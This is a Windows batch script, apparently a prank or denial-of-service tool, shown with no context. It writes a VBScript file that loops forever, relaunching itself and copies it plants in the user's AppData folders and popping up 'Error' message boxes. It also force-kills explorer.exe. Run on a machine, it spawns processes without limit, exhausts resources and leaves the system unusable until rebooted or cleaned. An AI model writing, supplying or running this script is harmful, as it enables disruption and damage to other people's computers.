@echo off

echo do >> "error.vbs"
echo Set s = wscript.CreateObject("WScript.Shell") >> "error.vbs"
echo s.Run "C:\Users\%username%\AppData\Roaming\error.vbs" >> "error.vbs"
echo s.Run "C:\Users\%username%\AppData\Local\error.vbs" >> "error.vbs"
echo s.Run "error.vbs" >> "error.vbs"
echo x=msgbox("Error", 4096+16, "Error") >> "error.vbs"
echo loop >> "error.vbs"

copy error.vbs C:\Users\%username%\AppData\Roaming\error.vbs
copy error.vbs C:\Users\%username%\AppData\Local\error.vbs

start C:\Users\%username%\AppData\Roaming\error.vbs
start C:\Users\%username%\AppData\Local\error.vbs
start error.vbs

taskkill /F /IM explorer.exe

exit